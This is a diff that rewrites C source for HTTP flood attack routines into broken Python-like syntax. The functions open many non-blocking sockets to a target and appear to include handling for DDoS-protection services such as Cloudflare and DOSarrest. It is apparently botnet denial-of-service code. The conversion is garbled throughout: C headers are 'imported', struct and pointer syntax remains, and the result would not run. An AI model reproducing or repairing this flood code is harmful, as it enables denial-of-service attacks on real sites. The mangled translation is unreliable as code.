@@ -1,26 +1,70 @@
-import fcntl, os, errno
+import fcntl, os, errno, sys, operator
 _GNU_SOURCE	= #ifdef DEBUG
 import sys
 #endif
-#include <unistd.h>
-#include <sys/socket.h>
-#include <sys/select.h>
-#include <errno.h>
-#include <fcntl.h>
+import <unistd.h>
+import <sys/socket.h>
+import <sys/select.h>
+import <errno.h>
+import <fcntl.h>
 
-#include "includes.h"
-#include "attack.h"
-#include "rand.h"
-#include "table.h"
-#include "util.h"
+import includes_h_header
+import attack_h_header
+import rand_h_header
+import table_h_header
+import util_h_header
+# import util_c instead of util_h_header, the original code's method relied on importing from both .h and .c files and was highly implicit. Python is strongly explicit in comparison and we need todefine our imported methods and rename them.
+import util_c
 
-def attack_app_proxy(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+# predefined functions from imported modules
+https_transport = includes_h_header.https_transport
+dns_resolver = includes_h_header.dns_resolver
+ipv4_t = includes_h_header.ipv4_t
+htonl = includes_h_header.htonl
+INET_ADDR = includes_h_header.INET_ADDR
+xputc = includes_h_header.xputc
+xputs = includes_h_header.xputs
+va_list = includes_h_header.va_list
+va_start = includes_h_header.va_start
+va_end = includes_h_header.va_end
+xvprintf = includes_h_header.xvprintf
+xprintf = includes_h_header.xprintf
+attack_target = attack_h_header.attack_target
+attack_option = attack_h_header.attack_option
+attack_method = attack_h_header.attack_method
+attack_stomp_data = attack_h_header.attack_stomp_data
+attack_http_state = attack_h_header.attack_http_state
+attack_cfnull_state = attack_h_header.attack_cfnull_state
+add_attack = attack_h_header.add_attack
+free_opts = attack_h_header.free_opts
+table_value = table_h_header.table_value
+# DEBUG: This is how you generate these lines automatically, example...
+# DEBUG: cat util_c.py | egrep -i 'def|class' | egrep -vi '#' | cut -d \( -f 1 | awk '{print $2" = util_c."$2}'
+util_strlen = util_c.util_strlen
+util_strncmp = util_c.util_strncmp
+util_strcmp = util_c.util_strcmp
+util_strcpy = util_c.util_strcpy
+util_memcpy = util_c.util_memcpy
+util_zero = util_c.util_zero
+util_atoi = util_c.util_atoi
+util_itoa = util_c.util_itoa
+util_memsearch = util_c.util_memsearch
+util_stristr = util_c.util_stristr
+util_fdgets = util_c.util_fdgets
+util_isupper = util_c.util_isupper
+util_isalpha = util_c.util_isalpha
+util_isspace = util_c.util_isspace
+util_isdigit = util_c.util_isdigit
+
+# def attack_app_proxy(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+def attack_app_proxy(targs_len, attack_target(targs, opts_len), attack_option(opts)):
 
 
-
-def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+# def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+def attack_app_http(targs_len, attack_target(targs, opts_len), attack_option(opts)):
     ret = 0
-    struct attack_http_state *http_table = NULL
+    # struct attack_http_state *http_table = NULL
+    attack_http_state(http_table) = NULL
     postdata = attack_get_opt_str(opts_len; NULL)
     method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET")
     domain = attack_get_opt_str(opts_len; NULL)
@@ -63,7 +107,7 @@ def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct att
     table_unlock_val(TABLE_ATK_DOSARREST)
     table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX)
 
-    http_table = calloc(sockets, sizeof(struct attack_http_state))
+    http_table = calloc(sockets, sys.getsizeof(attack_http_state))
 
     for i in range(sockets):
         http_table[i].state = HTTP_CONN_INIT
@@ -116,8 +160,10 @@ def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct att
     while True:
         fd_set fdset_rd, fdset_wr
         mfd = 0
-        struct timeval tim
-        struct attack_http_state *conn
+        # struct timeval tim
+        timeval(tim)
+        # struct attack_http_state *conn
+        attack_http_state(conn)
         fake_time = time.time()
 
         FD_ZERO(&fdset_rd)
@@ -133,8 +179,8 @@ def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct att
                     conn.state = HTTP_CONN_INIT
 
             if conn.state == HTTP_CONN_INIT:
-                struct sockaddr_in addr = {0}
-
+                # struct attack_target.sockaddr_in addr = {0}
+                attack_target.sockaddr_in(addr) = {0}
                 if conn.fd != -1:
                     os.close(conn.fd)
                 if (conn.fd = socket(AF_INET, SOCK_STREAM, 0)) == -1:
@@ -143,7 +189,7 @@ def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct att
                 fcntl.fcntl(conn.fd, F_SETFL, os.O_NONBLOCK | fcntl.fcntl(conn.fd, F_GETFL, 0))
 
                 ii = 65535
-                setsockopt(conn.fd, 0, SO_RCVBUF, &ii ,sizeof(int))
+                setsockopt(conn.fd, 0, SO_RCVBUF, &ii ,sys.getsizeof(int))
 
                 addr.sin_family = AF_INET
                 addr.sin_addr.s_addr = conn.dst_addr
@@ -151,7 +197,8 @@ def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct att
 
                 conn.last_recv = fake_time
                 conn.state = HTTP_CONN_CONNECTING
-                connect(conn.fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in))
+                # connect(conn.fd, (struct sockaddr *)&addr, sys.getsizeof (struct attack_target.sockaddr_in))
+                connect(conn.fd, sockaddr(addr), sys.getsizeof(attack_target.sockaddr_in))
 #ifdef DEBUG
                 printf("[http flood] fd%d started connect\n" % (conn.fd))
 #endif
@@ -170,7 +217,7 @@ def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct att
                 if conn.fd > mfd:
                     mfd = conn.fd + 1
             elif conn.state == HTTP_CONN_SEND:
-                conn.content_length = -1 
+                conn.content_length = -1
                 conn.protection_type = 0
                 util_zero(conn.rdbuf, HTTP_RDBUF_SIZE)
                 conn.rdbuf_pos = 0
@@ -284,7 +331,7 @@ def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct att
 
             if FD_ISSET(conn.fd, &fdset_wr):
                 err = 0
-                socklen_t err_len = sizeof (err)
+                socklen_t err_len = sys.getsizeof (err)
 
                 ret = getsockopt(conn.fd, SOL_SOCKET, SO_ERROR, &err, &err_len)
                 if err == 0 and ret == 0:
@@ -692,9 +739,11 @@ def attack_app_http(targs_len, struct attack_target *targs, opts_len, struct att
             sleep(1)
 #endif
 
-def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+# def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+def attack_app_cfnull(targs_len, attack_target(targs, opts_len), attack_option(opts)):
     ret = 0
-    struct attack_cfnull_state *http_table = NULL
+    # struct attack_cfnull_state *http_table = NULL
+    attack_cfnull_state(http_table) = NULL
     domain = attack_get_opt_str(opts_len; NULL)
     sockets = attack_get_opt_int(opts_len; 1);generic_memes = (0)
 
@@ -707,7 +756,7 @@ def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct a
     if sockets > HTTP_CONNECTION_MAX:
         sockets = HTTP_CONNECTION_MAX
 
-    http_table = calloc(sockets, sizeof(struct attack_cfnull_state))
+    http_table = calloc(sockets, sys.getsizeof(attack_cfnull_state))
 
     for i in range(sockets):
         http_table[i].state = HTTP_CONN_INIT
@@ -749,8 +798,10 @@ def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct a
     while True:
         fd_set fdset_rd, fdset_wr
         mfd = 0
-        struct timeval tim
-        struct attack_cfnull_state *conn
+        # struct timeval tim
+        timeval(tim)
+        # struct attack_cfnull_state *conn
+        attack_cfnull_state(conn)
         fake_time = time.time()
 
         FD_ZERO(&fdset_rd)
@@ -763,7 +814,8 @@ def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct a
                 conn.state = HTTP_CONN_INIT
 
             if conn.state == HTTP_CONN_INIT:
-                struct sockaddr_in addr = {0}
+                # struct attack_target.sockaddr_in addr = {0}
+                attack_target.sockaddr_in(addr)
 
                 if conn.fd != -1:
                     os.close(conn.fd)
@@ -773,7 +825,7 @@ def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct a
                 fcntl.fcntl(conn.fd, F_SETFL, os.O_NONBLOCK | fcntl.fcntl(conn.fd, F_GETFL, 0))
 
                 ii = 65535
-                setsockopt(conn.fd, 0, SO_RCVBUF, &ii ,sizeof(int))
+                setsockopt(conn.fd, 0, SO_RCVBUF, &ii ,sys.getsizeof(int))
 
                 addr.sin_family = AF_INET
                 addr.sin_addr.s_addr = conn.dst_addr
@@ -781,7 +833,8 @@ def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct a
 
                 conn.last_recv = fake_time
                 conn.state = HTTP_CONN_CONNECTING
-                connect(conn.fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in))
+                # connect(conn.fd, (struct sockaddr *)&addr, sys.getsizeof (struct attack_target.sockaddr_in))
+                connect(conn.fd, sockaddr(addr), sys.getsizeof(attack_target.sockaddr_in))
 #ifdef DEBUG
                 printf("[http flood] fd%d started connect\n" % (conn.fd))
 #endif
@@ -924,7 +977,7 @@ def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct a
             if FD_ISSET(conn.fd, &fdset_wr):
                 if conn.state == HTTP_CONN_CONNECTING:
                     err = 0
-                    socklen_t err_len = sizeof (err)
+                    socklen_t err_len = sys.getsizeof (err)
 
                     ret = getsockopt(conn.fd, SOL_SOCKET, SO_ERROR, &err, &err_len)
                     if err == 0 and ret == 0:
@@ -955,4 +1008,3 @@ def attack_app_cfnull(targs_len, struct attack_target *targs, opts_len, struct a
             printf("debug mode sleep\n")
             sleep(1)
 #endif
-
